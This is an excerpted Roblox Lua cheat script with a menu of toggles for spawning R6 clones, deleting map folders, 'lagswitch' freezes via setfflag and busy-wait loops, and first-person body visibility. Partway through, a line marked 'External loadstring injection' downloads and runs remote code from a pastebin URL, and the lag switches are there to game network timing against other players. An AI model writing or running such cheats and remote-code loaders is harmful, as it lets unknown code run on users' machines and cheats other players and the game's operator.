...
local function spawnR6Clone()
	if not cloneEnabled then return end

	local playerCache = Workspace:FindFirstChild("PlayerCache")
	if not playerCache then
		warn("PlayerCache folder not found in Workspace!")
		return
	end

	local targetFolder = playerCache:FindFirstChild("nymnmz")
	if not targetFolder then
		warn("nymnmz folder not found in PlayerCache!")
		return
	end

	local r6Template = targetFolder:FindFirstChild("R6")
	if not r6Template then
		warn("R6 model not found under nymnmz!")
		return
	end
	...
	table.insert(spawnedClones, clonedR6)
end
...
local mapClearerEnabled = false

local function clearIgnoreFolder()
	local mapFolder = workspace:FindFirstChild("Map")
	if mapFolder then
		local ignoreFolder = mapFolder:FindFirstChild("Ignore")
		if ignoreFolder then
			for _, child in ipairs(ignoreFolder:GetChildren()) do
				child:Destroy()
			end
		else
			warn("Ignore folder not found inside workspace.Map")
		end
	else
...
-- External loadstring injection
loadstring(game:HttpGet("https://pastebin.com/raw/vsdmFpr9"))()
...
local FFlagFreezeDuration   = 300  -- milliseconds
local fflagLagswitchListening = false

-- Apply the flag globally at load time
pcall(function()
    if setfflag then
...
local function triggerFFlagFreeze()
    local seconds = FFlagFreezeDuration / 1000
...
UserInputService.InputBegan:Connect(function(input, gpe)
    ...
    if input.KeyCode == FFlagLagswitchKey then
        task.spawn(triggerFFlagFreeze)
    end
end)

-- =====================================================
-- LAGSWITCH (busy-wait freeze)
-- =====================================================

local LagswitchEnabled        = false
local LagswitchKey            = Enum.KeyCode.E
local LagswitchFreezeDuration = 300  -- milliseconds
local lagswitchListening      = false

local function triggerLagswitch()
    local seconds = LagswitchFreezeDuration / 1000
    local start = os.clock()
    while os.clock() - start < seconds do end
end
...
MovFFlagLS:CreateToggle({
    ...
    Callback = function(v)
        ...
        if v then
            notify("FFlag Lagswitch enabled. Press [" .. FFlagLagswitchKey.Name .. "] to activate.", 3)
        else
...
MovFFlagLS:CreateTextbox({
    ...
    Callback = function(v)
        ...
        if n and n > 0 then
            ...
            notify("FFlag freeze duration set to: " .. tostring(n) .. "ms", 2)
        else
...
MovLS:CreateToggle({
    ...
    Callback = function(v)
        LagswitchEnabled = v
        if v then
            notify("Lagswitch enabled. Press [" .. LagswitchKey.Name .. "] to activate.", 3)
        else
...
MovLS:CreateTextbox({
    ...
    Callback = function(v)
        ...
        if n and n > 0 then
            ...
            notify("Lagswitch freeze duration set to: " .. tostring(n) .. "ms", 2)
        else
            notify("Enter a valid positive number.", 3)
        end
    end
...
local fovBodyEnabled = false
local fovBodyBound = false
...
local function fovIsFirstPerson(rig)
    ...
    return (cam.CFrame.Position - cam.Focus.Position).Magnitude < 1
end
...
local function fovBodyTick()
    if not fovBodyEnabled then return end
    ...
    local cam = Workspace.CurrentCamera or camera
    local isHighFOV = cam and cam.FieldOfView > 90
        ...
        if part:IsA("BasePart") then
            if isHighFOV then
                if fovArmParts[part.Name] then
                    part.LocalTransparencyModifier = actionActive and 1 or part.Transparency
...
local function enableFOVBody()
    if fovBodyBound then return end
    fovBodyBound = true
    RunService:BindToRenderStep("FOVBodyVisibility", Enum.RenderPriority.Camera.Value + 1, fovBodyTick)
end

local function disableFOVBody()
    fovBodyEnabled = false
    if fovBodyBound then
        RunService:UnbindFromRenderStep("FOVBodyVisibility")
        fovBodyBound = false
    end
    -- Restore rig transparency
    local rigsFolder = Workspace:FindFirstChild("Rigs")
    local myRig = rigsFolder and (rigsFolder:FindFirstChild(LocalPlayer.Name) or rigsFolder:FindFirstChild("hfurhutu"))
    if myRig then
        for _, part in ipairs(myRig:GetChildren()) do
            if part:IsA("BasePart") then
                part.LocalTransparencyModifier = part.Transparency
...
-- Clone System Section (World Tab - Left)
local WorldClone = WorldTab:CreateSection({ Name = "Clone System", Side = "Left" })

WorldClone:CreateToggle({
	Name = "Enable R6 Clone (Press Q to Spawn)",
	Default = false,
	Callback = function(v)
		cloneEnabled = v
		if v then
			notify("Clone System enabled. Press Q to spawn a clone.", 3)
		else
			notify("Clone System disabled.", 2)
		end
	end
})

WorldClone:CreateButton({
...
-- Map Clearer Section (World Tab - Left)
local WorldMapClearer = WorldTab:CreateSection({ Name = "Map Clearer", Side = "Left" })

WorldMapClearer:CreateToggle({
	Name = "Map Clearer",
	Default = false,
	Callback = function(v)
		mapClearerEnabled = v
		if v then
			clearIgnoreFolder()
			notify("Map Clearer enabled. Ignore folder cleared.", 2)
		else
			notify("Map Clearer disabled.", 2)
		end
	end
})
